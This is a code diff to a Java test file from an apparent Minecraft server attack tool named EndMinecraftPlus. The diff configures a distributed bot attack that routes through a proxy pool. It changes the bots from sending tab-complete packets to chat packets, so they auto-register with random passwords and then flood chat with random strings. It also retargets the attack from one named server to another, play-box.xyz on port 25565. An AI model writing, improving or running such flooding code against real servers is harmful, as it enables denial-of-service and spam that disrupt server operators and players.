@@ -2,7 +2,7 @@ package luohuayu.EndMinecraftPlus;
 
 import java.util.HashMap;
 
-import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
+import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 
 import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
 import luohuayu.EndMinecraftPlus.tasks.attack.DistributedBotAttack;
@@ -70,10 +70,10 @@ public class Test {
 							if(isjoin==null||((boolean)isjoin)==false) return;
 							Object islogin=c.getSession().getFlag("login");
 							if(islogin!=null&&((boolean)islogin)==true) {
-								c.getSession().send(new ClientTabCompletePacket(Utils.getRandomString(1,4)+"喵喵喵喵喵~"));
+								c.getSession().send(new ClientChatPacket(Utils.getRandomString(1,4)+"喵喵喵喵喵~"));
 							}else{
 								String pwd=Utils.getRandomString(7,12);
-								c.getSession().send(new ClientTabCompletePacket("/register "+pwd+" "+pwd));
+								c.getSession().send(new ClientChatPacket("/register "+pwd+" "+pwd));
 								c.getSession().setFlag("login",true);
 							}
 							
@@ -83,7 +83,7 @@ public class Test {
 				Utils.sleep(5*1000);
 			}
 		});
-		attack.start("mc4.icraft.cc", 41409);
+		attack.start("play-box.xyz", 25565);
 	}
 
 }
